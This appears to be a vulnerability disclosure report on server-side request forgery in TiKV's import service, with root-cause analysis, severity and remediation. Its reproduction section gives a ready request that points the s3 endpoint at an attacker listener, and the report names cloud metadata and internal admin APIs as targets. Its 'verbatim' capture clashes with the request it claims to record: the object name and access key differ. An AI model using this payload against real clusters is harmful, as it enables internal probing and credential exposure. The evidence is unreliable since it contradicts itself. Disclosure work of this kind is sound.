Title: Server-side request forgery: tikv-server fetches attacker-chosen URLs via client-supplied cloud-storage endpoints

Weakness: Server-Side Request Forgery (SSRF) (CWE-918)

Asset in Scope: TiDB product, such as TiKV, TiDB, TiFlash, PD

Description:
Server-side request forgery: tikv-server fetches attacker-chosen URLs via client-supplied cloud-storage endpoints.

SUMMARY
TiKV's import service downloads objects from "external storage" backends (S3, GCS, Azure, HDFS, local disk) whose connection parameters — endpoint URL, bucket, prefix, object name — are supplied entirely by the client in the Download/BatchDownload/Apply requests. A reader would expect the server to restrict which endpoints it contacts.

It does not: the endpoint is taken verbatim from the request. Measured outcome: pointing the s3 backend at an attacker-controlled HTTP listener made tikv-server issue a real "GET /ssrfproof/p/nonexistent.sst?x-id=GetObject" request to that listener, with the full AWS SigV4-signed request captured by the attacker, including host, path and signed headers. The server also reflects storage-layer error text back to the client, giving a response oracle against whatever is reachable at the attacker-chosen address.

AFFECTED PRODUCT
- Product: TiKV
- Version tested: 8.5.8, commit a1fdd6a59bb9c8a282c15677e1894501a52425cf (built from that source; default configuration — no TLS, no authentication)
- Environment: isolated local lab; the "attacker endpoint" was a local socket listener (no external network contacted)

VULNERABILITY DETAILS
- Weakness: server-side request forgery (CWE-918) via client-controlled backend configuration
- Required privileges: none
- Entry point: import_sstpb.ImportSST/Download with storage_backend.s3.endpoint (same backend construction is shared by BatchDownload, Apply and the backup path)
- Trust boundary crossed: unauthenticated network peer → the server's outbound HTTP client (internal network position of tikv-server)
- Root cause: the backend is built purely from request fields with no allow-list, no scheme/host validation and no egress policy — components/external_storage/src/export.rs:56-93 (Backend::S3(config) → S3Storage::from_input); the S3 endpoint from the request is applied as the endpoint URL in components/cloud/aws/src/s3.rs. Source: https://github.com/tikv/tikv/blob/a1fdd6a59bb9c8a282c15677e1894501a52425cf/components/external_storage/src/export.rs#L56-L93
- Measured unsafe effect: tikv-server emitted an attacker-directed HTTP GET (captured verbatim by the attacker's listener); storage error text (including the fetched URL) is reflected to the caller

REPRODUCTION
1. Start a logging TCP listener on the attacker host (lab: 127.0.0.1:9911).
2. Send one unauthenticated ImportSST/Download request with the s3 backend pointed at the listener:
   {"storage_backend":{"s3":{"endpoint":"http://127.0.0.1:9911","bucket":"ssrfproof","prefix":"p","force_path_style":true,"access_key":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"..."}},"name":"nonexistent.sst","sst":{"uuid":"...","cf_name":"default","region_id":2}}
3. Read the listener capture.

OBSERVED (captured by the attacker's listener, verbatim)
GET /ssrfproof/p/noexistent.sst?x-id=GetObject HTTP/1.1
x-amz-checksum-mode: ENABLED
user-agent: aws-sdk-rust/1.3.14 os/linux lang/rust/1.95.0-nightly
authorization: AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN4EXAMPLE/20260907/us-east-1/s3/aws4_request, SignedHeaders=host;...
host: 127.0.0.1:9911

The RPC response also reflects the storage error to the caller ("Cannot read http://127.0.0.1:9911/ssrfproof/p/nonexistent.sst ...: failed to get object dispatch failure"), giving a response oracle.

NEGATIVE CONTROL
The same request without static credentials produced no listener connection at all — the AWS SDK aborted before dispatch (recorded), isolating the observed connection as caused by the crafted backend, not ambient traffic..

Note: no testing was performed against any live infrastructure; the "attacker endpoint" was a loopback listener in the isolated lab.

Impact:
An unauthenticated peer makes tikv-server — a host with a trusted position on the cluster's internal network — issue arbitrary HTTP(S) requests to attacker-chosen endpoints, and return storage error text to the caller. Against cloud deployments this is the classic path to cloud-metadata credential exposure (link-local metadata services) and to probing or talking to internal-only services (PD admin APIs, management endpoints); the attacker fully controls endpoint host, port, path and the signed request.

Measured outcome: the attacker's listener captured tikv-server's complete outbound request — request line "GET /ssrfproof/p/nonexistent.sst?x-id=GetObject HTTP/1.1", AWS SigV4 authorization header, host header — proving the server connected to and issued the attacker-chosen request. The response oracle (raw storage errors including the fetched URL reflected to the caller) was also recorded.

Evidence limits: demonstrated in an isolated local lab with a loopback listener; actual credential/metadata exposure was not demonstrated and is not claimed — the claim is the unrestricted attacker-directed request primitive.

Severity: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 (High) — program criteria map SSRF to High ("SSRF to obtain sensitive internal information").

Remediation: do not accept connection parameters from the request — reference pre-configured storage backends by name; if client-supplied endpoints must be supported, enforce an operator-configured allow-list and block link-local/metadata (169.254.169.254) and cluster-internal ranges; stop reflecting raw storage errors to unauthenticated callers.
